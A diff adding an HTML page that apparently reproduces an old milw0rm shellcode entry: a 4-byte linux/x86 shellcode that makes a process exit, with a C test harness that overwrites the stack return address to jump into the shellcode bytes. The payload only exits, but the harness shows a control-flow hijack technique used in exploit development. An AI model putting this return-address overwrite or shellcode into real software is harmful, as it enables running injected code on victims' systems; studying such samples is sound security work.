@@ -1,0 +1,17 @@
+<html><head><title>linux/x86 quick (yet conditional, eax != 0 and edx == 0) exit 4 bytes</title></head><pre>/*
+ * (linux/x86) quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes
+ * - izik &lt;izik@tty64.org&gt;
+ */
+
+char shellcode[] = 
+
+	&quot;\xf7\xf0&quot;              // div %eax 
+	&quot;\xcd\x80&quot;;             // int $0x80
+
+int main(int argc, char **argv) {
+	int *ret;
+	ret = (int *)&amp;ret + 2;
+	(*ret) = (int) shellcode;
+}
+
+// milw0rm.com [2006-01-21]</pre></html>
